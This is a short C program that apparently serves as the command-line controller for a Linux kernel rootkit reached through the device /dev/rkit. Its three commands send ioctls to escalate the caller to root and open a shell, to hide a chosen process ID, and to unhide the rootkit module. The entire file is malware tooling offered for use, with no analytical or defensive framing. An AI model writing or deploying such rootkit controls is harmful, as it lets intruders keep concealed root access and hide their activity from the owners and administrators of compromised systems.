#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>

#define DEVICE "/dev/rkit"
#define IOCTL_PRIVESC  _IO('r', 1)
#define IOCTL_HIDE_PID _IOW('r', 2, int)
#define IOCTL_SHOW_MOD _IO('r', 3)

int main(int argc, char *argv[])
{
    int fd;

    if (argc < 2) {
        fprintf(stderr, "Usage: %s root|hide <pid>|show\n", argv[0]);
        return 1;
    }

    fd = open(DEVICE, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    if (strcmp(argv[1], "root") == 0) {
        ioctl(fd, IOCTL_PRIVESC);
        close(fd);
        execl("/bin/sh", "sh", NULL);
    } else if (strcmp(argv[1], "hide") == 0 && argc == 3) {
        int pid = atoi(argv[2]);
        ioctl(fd, IOCTL_HIDE_PID, pid);
    } else if (strcmp(argv[1], "show") == 0) {
        ioctl(fd, IOCTL_SHOW_MOD);
    } else {
        fprintf(stderr, "Unknown command\n");
        close(fd);
        return 1;
    }

    close(fd);
    return 0;
}
